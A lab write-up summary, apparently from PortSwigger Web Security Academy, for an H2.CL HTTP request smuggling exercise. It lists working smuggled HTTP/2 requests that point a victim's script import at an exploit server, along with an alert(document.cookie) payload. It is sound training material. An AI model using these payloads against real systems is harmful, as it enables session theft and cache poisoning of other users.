## H2.CL request smuggling

**Category:** request_smuggling
**Difficulty:** Unknown

### Description
This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.

### Solution Steps
Solving this lab requires a technique that we covered in the earlier
HTTP request smuggling materials
You need to poison the connection immediately before the victim's browser attempts to import a JavaScript resource. Otherwise, it will fetch your payload from the exploit server but not execute it. You may need to repeat the attack several times before you get the timing right.

### Key Payloads
- `alert(document.cookie)`
- `Content-Length: 0`
- `POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

SMUGGLED`
- `GET /resources`
- `https://YOUR-LAB-ID.web-security-academy.net/resources/`
- `/resources`
- `Host`
- `POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: foo
Content-Length: 5

x=1`
- `POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Length: 5

x=1`
- `GET /resources/`

### Indicators of Success
- Request desync between front/back-end
- Subsequent request poisoned
- Other user's request captured
- Cache poisoned via smuggling
- Access controls bypassed
---
*Source: PortSwigger Web Security Academy*
